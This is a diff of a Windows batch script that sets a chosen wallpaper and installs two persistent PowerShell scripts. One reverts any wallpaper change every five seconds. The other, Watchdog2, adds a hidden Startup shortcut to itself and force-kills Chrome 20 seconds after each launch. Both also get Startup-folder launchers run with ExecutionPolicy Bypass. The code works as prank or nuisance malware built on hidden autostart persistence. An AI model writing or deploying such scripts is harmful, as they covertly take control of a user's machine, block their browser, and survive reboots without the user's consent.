@@ -1,82 +1,101 @@
 @echo off
-setlocal enabledelayedexpansion
+setlocal
 
-:: Deploy watchdog2.ps1
-set "watchdogPath=%APPDATA%\watchdog2.ps1"
+:: Ask for image path
+set /p "imgPath=Enter full path of image: "
+
+:: Check if exists
+if not exist "%imgPath%" (
+    echo File does not exist.
+    pause
+    exit /b
+)
+
+:: Save path
+set "saveFile=%APPDATA%\savedWallpaperPath.txt"
+echo %imgPath% > "%saveFile%"
+
+:: Set wallpaper using PowerShell
+powershell -NoProfile -Command ^
+"Add-Type @'
+using System;
+using System.Runtime.InteropServices;
+public class NativeMethods {
+    [DllImport(\"user32.dll\", SetLastError = true)]
+    public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
+}
+'@; [NativeMethods]::SystemParametersInfo(20, 0, '%imgPath%', 3)"
+
+echo Wallpaper set successfully!
+
+:: Create MonitorWallpaper.ps1
+set "monitorScript=%APPDATA%\MonitorWallpaper.ps1"
 (
-    echo ^# watchdog2.ps1 - Monitor and kill chrome.exe after 20 seconds
-    echo $scriptPath = $MyInvocation.MyCommand.Path
-    echo $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\watchdog2.bat"
-    echo if (!(Test-Path $startupPath)) {
-    echo     "@echo off
-powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"^"$scriptPath^"`"" ^| Out-File -Encoding ASCII $startupPath
+    echo $savedPath = Get-Content "%saveFile%"
+    echo function Set-Wallpaper($path) {
+    echo     Add-Type @"
+    echo     using System;
+    echo     using System.Runtime.InteropServices;
+    echo     public class NativeMethods {
+    echo         [DllImport("user32.dll", SetLastError = true)]
+    echo         public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
+    echo     }
+    echo "@
+    echo     [NativeMethods]::SystemParametersInfo(20, 0, $path, 3) ^| Out-Null
     echo }
     echo while ($true) {
-    echo     $chrome = Get-Process -Name "chrome" -ErrorAction SilentlyContinue
-    echo     if ($chrome) {
-    echo         Write-Host "Chrome detected. Waiting 20 seconds before terminating..."
-    echo         Start-Sleep -Seconds 20
-    echo         try {
-    echo             Get-Process -Name "chrome" -ErrorAction SilentlyContinue ^| Stop-Process -Force
-    echo             Write-Host "Chrome terminated."
-    echo         } catch {
-    echo             Write-Host "Failed to terminate Chrome: $_"
-    echo         }
+    echo     $current = (Get-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name Wallpaper).Wallpaper
+    echo     if ($current -ne $savedPath) {
+    echo         Set-Wallpaper $savedPath
+    echo         Write-Host "Wallpaper restored."
     echo     }
     echo     Start-Sleep -Seconds 5
     echo }
-) > "%watchdogPath%"
+) > "%monitorScript%"
 
-:: Optionally: launch watchdog2 immediately
-powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%watchdogPath%" &
+:: Create Watchdog2.ps1
+set "watchdogScript=%APPDATA%\Watchdog2.ps1"
+(
+    echo function Add-Startup {
+    echo     $script = $MyInvocation.MyCommand.Definition
+    echo     $WshShell = New-Object -ComObject WScript.Shell
+    echo     $shortcut = $WshShell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Watchdog2.lnk")
+    echo     $shortcut.TargetPath = "powershell.exe"
+    echo     $shortcut.Arguments = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$script`""
+    echo     $shortcut.Save()
+    echo }
+    echo Add-Startup
+    echo Write-Host "Watchdog2 running..."
+    echo while ($true) {
+    echo     $proc = Get-Process chrome -ErrorAction SilentlyContinue
+    echo     if ($proc) {
+    echo         Write-Host "Chrome detected. Waiting 20 seconds..."
+    echo         Start-Sleep -Seconds 20
+    echo         Stop-Process -Name chrome -Force -ErrorAction SilentlyContinue
+    echo         Write-Host "Chrome closed by Watchdog2."
+    echo     }
+    echo     Start-Sleep -Seconds 5
+    echo }
+) > "%watchdogScript%"
 
-:: Deploy or confirm other wallpaper monitor scripts
-if exist "%APPDATA%\monitorWallpaper.ps1" (
-    echo Wallpaper monitor script already exists.
-) else (
-    echo Creating default monitorWallpaper.ps1...
-    set "psScriptPath=%APPDATA%\monitorWallpaper.ps1"
-    (
-        echo $savedPath = Get-Content "%APPDATA%\savedWallpaperPath.txt"
-        echo $checkInterval = 5
-        echo function Set-Wallpaper($path) {
-        echo     Add-Type @"
-        echo using System;
-        echo using System.Runtime.InteropServices;
-        echo public class NativeMethods {
-        echo     [DllImport("user32.dll", SetLastError = true)]
-        echo     public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
-        echo }
-"@
-        echo     [NativeMethods]::SystemParametersInfo(20, 0, $path, 3) ^| Out-Null
-        echo }
-        echo while ($true) {
-        echo     $currentWallpaper = (Get-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name Wallpaper).Wallpaper
-        echo     if ($currentWallpaper -ne $savedPath) {
-        echo         Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name Wallpaper -Value $savedPath
-        echo         Set-Wallpaper $savedPath
-        echo         Write-Host 'Wallpaper reset to saved image'
-        echo     }
-        echo     Start-Sleep -Seconds $checkInterval
-        echo }
-    ) > "%psScriptPath%"
-)
+:: Create Startup launchers
+set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 
-:: Ensure wallpaper monitor runs at startup
-set "startupMonitor=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\runMonitor.bat"
-if not exist "%startupMonitor%" (
-    (
-        echo @echo off
-        echo powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%psScriptPath%"
-    ) > "%startupMonitor%"
-)
+:: For MonitorWallpaper
+(
+    echo @echo off
+    echo powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%monitorScript%"
+) > "%startupFolder%\RunMonitorWallpaper.bat"
+
+:: For Watchdog2 (it also adds itself but we can do it for safety)
+(
+    echo @echo off
+    echo powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%watchdogScript%"
+) > "%startupFolder%\RunWatchdog2.bat"
 
 echo.
-echo Watchdog2 and Wallpaper monitor deployed.
-echo Watchdog2 will monitor and close Chrome after 20 seconds.
-echo Wallpaper monitor ensures persistent wallpaper.
+echo All scripts created successfully!
+echo MonitorWallpaper and Watchdog2 will auto-run at startup.
 echo.
 pause
 exit /b
-
-
